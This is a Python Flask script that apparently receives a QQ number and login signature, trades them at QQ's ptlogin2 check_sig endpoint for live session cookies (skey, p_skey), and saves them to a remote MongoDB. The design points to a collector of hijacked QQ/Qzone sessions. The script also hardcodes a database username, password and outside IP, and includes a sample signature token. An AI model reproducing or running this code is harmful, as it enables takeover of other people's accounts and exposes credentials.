# -*- coding:utf-8 -*-
import requests

class QQ():
    def __init__(self,qq,url):
        self.qq = qq
        self.url = url
    def getCookie(self):
        url = 'https://ptlogin2.qzone.qq.com/check_sig?pttype=2&uin='+self.qq+'&service=jump&nodirect=0&ptsigx='+self.url+'&s_url=https%3A%2F%2Fqzs.qzone.qq.com%2Fqzone%2Fv5%2Floginsucc.html%3Fpara%3Dizone&f_url=&ptlang=2052&ptredirect=100&aid=1000101&daid=5&j_later=0&low_login_hour=0&regmaster=0&pt_login_type=2&pt_aid=549000912&pt_aaid=0&pt_light=0&pt_3rd_aid=0'
        r = requests.get(url,allow_redirects=False)
        cookie = r.cookies.get_dict()

        if len(cookie) == 0:
            return False
        else:
            data = {
                'uin':self.qq,
                'skey':cookie['skey'],
                'p_skey':cookie['p_skey'],
                'cookie':cookie
            }
            # print(data['cookie'])
            return data

class Tool():
    def getQqStatus(qq):
        if mongo.db.qquser.find({'uin': qq}).count() != 0:
            return False
        else:
            return True
    def getQq(qq,url):
        if Tool.getQqStatus(qq):
            print('新增加')
            content = QQ(qq, url).getCookie()
            mongo.db.qquser.insert(content)
        else:
            print('更新')
            mongo.db.qquser.remove({'uin':qq})
            content = QQ(qq, url).getCookie()
            mongo.db.qquser.insert(content)




from flask import Flask, request, redirect
import time
from flask_cors import *
from flask_pymongo import PyMongo
from bson import ObjectId
app = Flask(__name__)
CORS(app, supports_credentials=True)
app.config.update(
    MONGO_URI='mongodb://chuxia:ddfeed.2541@117.50.46.232:25412/qquser',
)
mongo = PyMongo(app)
@app.route('/', methods=['POST', 'GET'])
def index():
    try:
        uin = request.form.get('uin')
        url = request.form.get('url')
        Tool.getQq(uin,url)
    except:
        pass
    return "123123"




if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
url = 'https://ptlogin2.qzone.qq.com/check_sig?pttype=2&uin=323232&service=jump&nodirect=0&ptsigx=6aaf9fcec8f332e518de6770f03b027ad1e6e0f86ea1dfef0b5e493b10c0b48c1101f46756383a2b74c71020ca045fc16e7b2b14d84ef7b5f297b08b361763d3&s_url=https%3A%2F%2Fqzs.qzone.qq.com%2Fqzone%2Fv5%2Floginsucc.html%3Fpara%3Dizone&f_url=&ptlang=2052&ptredirect=100&aid=1000101&daid=5&j_later=0&low_login_hour=0&regmaster=0&pt_login_type=2&pt_aid=549000912&pt_aaid=0&pt_light=0&pt_3rd_aid=0'
